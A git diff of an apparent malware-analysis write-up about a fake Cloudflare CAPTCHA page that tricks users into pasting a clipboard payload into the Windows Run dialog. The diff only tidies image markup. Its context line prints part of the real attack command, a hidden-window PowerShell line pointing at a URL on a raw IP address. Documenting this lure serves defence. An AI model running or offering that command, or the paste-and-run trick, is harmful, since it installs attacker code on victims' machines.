@@ -88,9 +88,9 @@ const command = `powershell  -w h -NoP -c "$u='http://216.245.184.93/bdA.lim';$p
 ```
 This function will copy the content of the command string into the clipboard and show the users the following page:
 
-<p style="center">
+
 ![Second stage fake CF CAPTCHA](./second_stage_fake_captcha.png)
-</p>
+
 
 Here, the attacker asks the user to press "window button + R" (to open Windows Run) and then press CTRL+v (to paste the malicious payload in the memory into run window) and press Enter.
 
